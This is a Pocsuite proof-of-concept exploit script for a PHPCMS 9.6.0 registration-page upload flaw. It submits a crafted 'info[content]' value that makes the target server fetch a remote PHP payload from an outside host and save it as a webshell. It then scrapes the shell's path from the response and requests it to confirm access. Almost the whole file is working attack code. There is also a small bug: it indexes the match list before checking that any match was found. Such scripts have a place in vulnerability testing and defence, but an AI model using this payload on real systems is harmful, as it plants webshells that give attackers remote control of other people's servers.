#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output
from pocsuite.api.poc import POCBase
from pocsuite.api.utils import randomStr
import re

class phpcms_getshll(POCBase):
    vulID = '92930'  # vul ID
    version = '1'
    author = 'Xiaofu'
    vulDate = '2017-04-10'
    createDate = '2017-04-14'
    updateDate = '2017-04-14'
    references = ['https://www.seebug.org/vuldb/ssvid-92930']
    name = 'PHPCMS 9.6 getshell'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'phpcms'
    appVersion = '9.6.0'
    vulType = 'Getshell'
    desc = '''
        PHPCMS在注册页面存在上传漏洞，
        可通过构造info[content]参数，
        以文件包含的方式上传webshell。
    '''
    samples = []

    def _verify(self):
        result = {}
        url = self.url + "/index.php?m=member&c=index&a=register&siteid=1"
        username = randomStr(6)
        password = randomStr(6,'1234567890')
        data = {
            "siteid": "1",
            "modelid": "1",
            "username": "%s"%(username),
            "password": "%s"%(password),
            "email": "%s@qq.com"%(username),
            "info[content]": "<img src=http://pocsuite.org/include_files/php_attack.txt?.php#.jpg> ",
            "dosubmit": "1",
            "protocol": "",
        }
        match = "img src=(.+?)(/[0-9]{4}/[0-9]{4}/)([0-9]+?).php"
        resp = req.post(url, data=data)
        shell = re.findall(match,resp.text)
        shellinfo = ''.join(shell[0]) + ".php"
        if shell:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            shell_resp = req.get(shellinfo)
            if shell_resp.status_code == 200:
                result['VerifyInfo']['webshell'] = shellinfo
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

    def _attack(self):
        return self._verify()


register(phpcms_getshll)
